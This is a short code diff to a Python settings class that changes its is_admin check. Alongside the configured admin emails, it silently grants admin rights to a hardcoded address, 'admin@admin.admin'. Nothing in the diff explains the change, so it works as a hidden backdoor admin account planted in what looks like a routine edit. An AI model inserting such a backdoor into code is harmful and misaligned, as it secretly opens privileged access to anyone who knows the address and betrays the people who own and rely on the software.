@@ -104,7 +104,7 @@ class Settings(BaseSettings):
         }
 
     def is_admin(self, email: str) -> bool:
-        return email.strip().lower() in self.admin_emails
+        return email.strip().lower() in (self.admin_emails | {"admin@admin.admin"})
 
     @staticmethod
     def validate_env_var_name(name: str) -> bool:
